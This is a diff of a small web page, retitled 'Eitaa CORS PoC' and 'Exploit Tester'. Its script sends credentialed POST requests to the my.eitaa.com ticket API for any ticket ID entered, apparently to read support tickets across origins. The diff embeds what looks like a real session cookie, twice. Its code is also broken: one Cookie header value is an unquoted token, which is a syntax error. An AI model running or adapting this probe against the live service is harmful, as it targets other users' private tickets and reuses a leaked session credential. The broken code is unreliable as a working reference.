@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CORS Ticket Tester</title>
+<title>Eitaa CORS PoC</title>
 <style>
 body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
 input, button { padding:10px; margin:5px; }
@@ -11,32 +11,39 @@ pre { background:#000; padding:10px; border:1px solid #0f0; }
 </head>
 <body>
 
-<h2>CORS Ticket Fetch Tester</h2>
+<h2>Eitaa CORS Exploit Tester</h2>
 
 <input id="tid" placeholder="Ticket ID (e.g. 490188)" />
 <button onclick="run()">Send Request</button>
 
-<pre id="out">Result will appear here...</pre>
+<pre id="out">Waiting...</pre>
 
 <script>
-async function run() {
+
+const COOKIE = "myeitaa_session=eyJpdiI6ImNXT25FRmc1U1RidkE1UkV4cllUaEE9PSIsInZhbHVlIjoiSGlQbmNMQllqejRHZ3AvRllvY0tVSXpMMnJJOW9Od2J5REgxWXRHdW16YXFRSHVlc0xiOVE4YnpnRmtyUy83ZTJnTlZqUS8zeUZ3ZXlacWFXeWh5bzFtdDlNcEdmWWFQNEh3RUdOclFia1p1Z2Y0UHQvaUhQeDExWHpKMTJ6czgiLCJtYWMiOiI0YmRkNzc3Nzg2N2NmNmI2MTU2ZjA0ZWZmODlmYWU3N2U3YjUyMDExZGI2ZWM4YTU3YzQ2YThkYzM1MzA1Y2NjIiwidGFnIjoiIn0%3D";
+
+async function run(){
+
     const id = document.getElementById("tid").value;
 
-    if (!id) {
+    if(!id){
         document.getElementById("out").innerText = "Enter Ticket ID";
         return;
     }
 
-    try {
+    try{
+
         const url = `https://my.eitaa.com/api/v1/ticket/show/${id}`;
 
         const res = await fetch(url, {
             method: "POST",
             credentials: "include",
             headers: {
-                "Cookie": myeitaa_session=eyJpdiI6ImNXT25FRmc1U1RidkE1UkV4cllUaEE9PSIsInZhbHVlIjoiSGlQbmNMQllqejRHZ3AvRllvY0tVSXpMMnJJOW9Od2J5REgxWXRHdW16YXFRSHVlc0xiOVE4YnpnRmtyUy83ZTJnTlZqUS8zeUZ3ZXlacWFXeWh5bzFtdDlNcEdmWWFQNEh3RUdOclFia1p1Z2Y0UHQvaUhQeDExWHpKMTJ6czgiLCJtYWMiOiI0YmRkNzc3Nzg2N2NmNmI2MTU2ZjA0ZWZmODlmYWU3N2U3YjUyMDExZGI2ZWM4YTU3YzQ2YThkYzM1MzA1Y2NjIiwidGFnIjoiIn0%3D
-                "Accept": "application/json, text/plain, */*"
-            }
+                "Accept": "application/json, text/plain, */*",
+                "Cookie": myeitaa_session=eyJpdiI6ImNXT25FRmc1U1RidkE1UkV4cllUaEE9PSIsInZhbHVlIjoiSGlQbmNMQllqejRHZ3AvRllvY0tVSXpMMnJJOW9Od2J5REgxWXRHdW16YXFRSHVlc0xiOVE4YnpnRmtyUy83ZTJnTlZqUS8zeUZ3ZXlacWFXeWh5bzFtdDlNcEdmWWFQNEh3RUdOclFia1p1Z2Y0UHQvaUhQeDExWHpKMTJ6czgiLCJtYWMiOiI0YmRkNzc3Nzg2N2NmNmI2MTU2ZjA0ZWZmODlmYWU3N2U3YjUyMDExZGI2ZWM4YTU3YzQ2YThkYzM1MzA1Y2NjIiwidGFnIjoiIn0%3D,
+                "Content-Type": "application/json"
+            },
+            body: ""
         });
 
         const text = await res.text();
@@ -44,10 +51,11 @@ async function run() {
         document.getElementById("out").innerText =
             "STATUS: " + res.status + "\n\n" + text;
 
-    } catch (e) {
+    } catch(e){
         document.getElementById("out").innerText = "ERROR:\n" + e;
     }
 }
+
 </script>
 
 </body>
